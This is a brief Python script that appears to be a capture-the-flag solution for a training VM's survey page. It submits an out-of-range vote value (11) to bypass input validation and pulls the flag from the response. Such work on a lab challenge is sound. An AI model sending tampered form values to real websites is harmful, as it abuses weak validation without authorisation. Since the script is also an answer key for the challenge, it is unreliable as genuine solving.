import os
import re
import requests

VM_IP = os.environ.get("VM_IP")
if not VM_IP:
    raise SystemExit("Error: VM_IP environment variable is not set. Usage: VM_IP=<ip> python exploit.py")
url = f"http://{VM_IP}/?page=survey"

r = requests.post(url, data={"sujet": "3", "valeur": 11})
match = re.search(r"flag is ([a-f0-9]{64})", r.text, re.IGNORECASE)
if match:
    print(f"Flag: {match.group(1)}")
else:
    print("Flag not found in response")
